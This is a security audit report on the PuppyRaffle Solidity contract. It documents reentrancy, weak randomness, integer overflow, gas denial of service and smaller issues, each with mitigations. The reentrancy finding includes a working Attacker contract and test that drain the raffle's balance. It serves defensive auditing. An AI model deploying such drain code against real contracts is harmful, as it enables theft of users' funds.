# Audit Report PuppyRaffle

### [H-1] Reentrancy Attack in `PuppyRaffle::refund` allows entrant to drain raffle balance

The `PuppyRaffle::refund` function does not follow CEI and as a result enables participants to drain the contract balance.

In `PuppyRaffle::refund` we first make an external call to `msg.sender` and only after making an external call do we update the `PuppyRaffle:players` array.

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again to claim once more. This could continue until the contract has a balance of 0.

All fees paid by entrants could be stolen by a malicious party.

**Proof of Concept:**

1. User enters raffle
2. Attacker sets upd a contract with a `fallback` function cals calls `PuppyRaffle::refund`
3. Attacker enters Raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

<details>
<summary>Code</summary>

Place the following into the tests

```javascript
    function test_reentrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        Attacker attackerContract = new Attacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackerContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        // attack
        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("Starting Attacker contract balance", startingAttackerContractBalance);
        console.log("Starting contract balance", startingContractBalance);

        console.log("Ending Attacker contract balance", address(attackerContract).balance);
        console.log("Ending contract balance", address(puppyRaffle).balance);
    }
```

As well as this contract

```javascript
    contract Attacker {
        PuppyRaffle puppyRaffle;
        uint256 fee;
        uint256 attackerIndex;

        constructor(PuppyRaffle _puppyRaffle) {
            puppyRaffle = _puppyRaffle;
            fee = puppyRaffle.entranceFee();
        }

        function attack() external payable {
            address[] memory players = new address[](1);
            players[0] = address(this);
            puppyRaffle.enterRaffle{value: fee}(players);

            attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));

            puppyRaffle.refund(attackerIndex);
        }

        function _steal() internal {
            if (address(puppyRaffle).balance >= fee) {
                puppyRaffle.refund(attackerIndex);
            }
        }

        fallback() external payable {
            _steal();
        }

        receive() external payable {
            _steal();
        }
    }
```

</details>

**Recommended Mitigation:** 
To prevent Reentrancy, `PuppyRaffle::refund` should update the `players`array before making the external call. Additionally, the event emission should also be moved up inside the function.

### [H-2] Weak Randomness in `PuppyRaffle::selectWinner` allows user to predict and influence the winner

The use of keccak256 hash functions on predictable values like block.timestamp, block.number, or similar data, including modulo operations on these values, should be avoided for generating randomness, as they are easily predictable and manipulable. The `PREVRANDAO` opcode also should not be used as a source of randomness.

**Impact**
Any User can influence the outcome of the raffle, winning ETH and selecting the `rarest` puppy. 

**Proof of Concept**

1. Validators can know ahead of time what `block.timestamp` and `block.difficutly` will be.
2. Users can manipulate their `msg.sender` to result in their address being used to generate the winner.
3. Users can revert their `selectWinner`tx if they don´t like the winner or resulting puppy.

Using on-chain values as a randomness seed is a well documented attack vector.

**Recommended Mitigation:** 

Use a proofably random number generator like Chainlink VRF.

### [H-3] Integer overflow of `PuppyRaffle::totalFees` looses fees.

Solidity versions prior to `0.8.0` had integers subject to integer overflow.

```javascript
uint64 testVar = type(uint64).max
> 18446744073709551615
testVar = testVar + 1
> 0
```

**Proof of Concept**
1. We conclude a raffle of 4 players
2. We then have 89 players enter a new raffle and conclude the raffle
3. `totalFees`will be overflow
4. You will not be able do withdraw due to this line in `PuppyRaffel::withdrawFees`:
```javascript
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Although `selfdestruct` could be used to send ETH to this contract in order for the values to match and withdraw the fees, this is against the intended design. At some point there could be too much balance in the contract to withdraw at all.

**Recommended Mitigation:** 

1. Use a newer version of solidity and uint256 instead of uint64.
2. Alternatively use the `SafeMath` library of OpennZeppelin. The uint64 should still be changed to uint256 for the previously mentioned reason.
3. Remove the balance check from `PuppyRaffel::withdrawFees`.
```diff
-   require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

**Impact**
In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress`to collect later in `PuppyRaffle:withdrawFees`, However if the variable overflows. the fees could not be paid out correctly. 

### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential DoS attack, increasing gas costs for future users

**Description:** The `PuppyRaffle::enterRaffle`function loops through the `players`array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs will increase dramatically the more players enter the raffle. The additional address in the `players` array means an additional loop and therefore increase gas cost.

**Impact:** 
The gas cost fir raffle entrants will greatly increase as more players enter, discouraging later users from entering, and causing a rush at the start to be the first in the queue.

An attacker could make the `players` array so big, that no one else will enter, guaranteeing them the win.

**Proof of Concept:**

If we have two sets of 100 players each enter, the gas costs will be as such:
- 1st set of 100 players: ~6252128 gas
- 2nd set of 100 players: ~18068218 gas

This is nearly 3x more expensive than for the first set of players.

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
    function test_denialOfService() public {
        vm.txGasPrice(1);
        // Enter 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }

        // check gas costs
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas used for first 100 players", gasUsedFirst);

        // Enter more players
        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        }

        // check gas costs
        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersTwo.length}(playersTwo);
        uint256 gasEnd2 = gasleft();

        uint256 gasUsedSecond = (gasStart2 - gasEnd2) * tx.gasprice;
        console.log("Gas used for second 100 players", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }
```
</details>

**Recommended Mitigation:** 

1. Consider allowing duplicates. Users can make new wallet addresses anyway, so duplicate checks don´t prevent the same person from entering multiple times.
2. Consider using a mapping to check if a user has already entered.


### [M-2] Smart Contract wallets raffle winners without `receive`or `fallback` function will block the start of a new contest

The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However if the winner is a smart contract wallet that rejects the payment, the lottery would not be able to finish and start again.

Users could easily calle the `selectWinner` function again and non-wallet entrants could enter, but it could cost a lot due to the duplicate check and a lottery reset could get very challenging.

**Impact:** 
`Puppyraffel::selectWinner` function could revert many times, making a lottery reset difficult.
Also true winners would not get paid out and someone else could take the winning amount.

**Proof of Concept**

1. 10 Smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The `selectWinner` function would not work even though the lottery is over.

**Recommended Mitigation**

1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of address -> payout so winners can pull their funds out themselves with a new `claimPrize` function.

### [L-1] `PuppyRaffle:getActivePlayerIndex` returns 0 for non-existen players and for players at index 0.

If a player is at index 0 in the `PuppyRaffle:players` array, this will return 0. But according to the natspec it will also return 0 if a user is not in the array. This causes the player at index 0 to incorrectly think they have not entered the raffle.

```javascript
    /// @return the index of the player in the array, if they are not active, it returns 0
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```

This causes the player at index 0 to incorrectly think they have not entered the raffle. This might cause and attempt to reenter the Raffle.

**Proof of Concept**

1. User enters the Raffle as teh first entrant
2. `PuppyRaffle::getActivePlayersIndex` returns 0
3. User thinks they have not entered correctly due to the function documentation and attempts to enter again.

**Recommended Mitigation:** 

Revert if the player is not in the array instead of returning 0.

## Informational
### [I-1]: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>1 Found Instances</summary>

- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

    ```solidity
    pragma solidity ^0.7.6;
    ```

</details>

### [I-2]: Using outdated Solidity version

solc-0.7.6 is an outdated solc version. Use a more recent version (at least 0.8.0), if possible. Use at least `pragma solidity 0.8.0;`.

### [I-3]: Missing checls for `address(0)` when assinging values to address state variables

Assinging values to address state vairables without checking for `address(0)`

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 67](src/PuppyRaffle.sol#L67)

    ```solidity
            feeAddress = _feeAddress;
    ```

- Found in src/PuppyRaffle.sol [Line: 189](src/PuppyRaffle.sol#L189)

    ```solidity
            feeAddress = newFeeAddress;
    ```

</details>

### [I-4] `PuppyRaffle::selectWinenr` does not follow CEI

It is best to keep the code clean and follow CEI.

```diff
-   (bool success,) = winner.call{value: prizePool}("");
-   require(success, "PuppyRaffle: Failed to send prize pool to winner");
    _safeMint(winner, tokenId);
+   (bool success,) = winner.call{value: prizePool}("");
+   require(success, "PuppyRaffle: Failed to send prize pool to winner");
```


### [I-5] Use of "magic" numbers is discouraged

It can be confusing to see number literals in a codebase and it is much more readable if numbers are given a name.

Examples:
```javascript
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
```
instead you could use
```javascript
    uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
    uint256 public constant FEE_PERCENTAGE = 20;
    uint256 public constant POOL_PRECISION = 100;
```

### [I-6] Missing events on state changes

### [I-7] `PuppyRaffle::_isActivePlayer` is never used and should be removed

## Gas
### [G-1]: Unchanged state varibales should be declared constant

Reading from storage is much more expensive than from a constan or immutable variable.
Instances:
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonInageUrl` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

### [G-2]: Storage Variables in a loop should be chached

Every call to `players.length` calls storage which is gas inefficient

```diff
+       uint256 playerLength = players.length;
-       for (uint256 i = 0; i < players.length - 1; i++) {
+       for (uint256 i = 0; i < playerLength - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
+           for (uint256 j = i + 1; j < playerLength; j++) { 
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```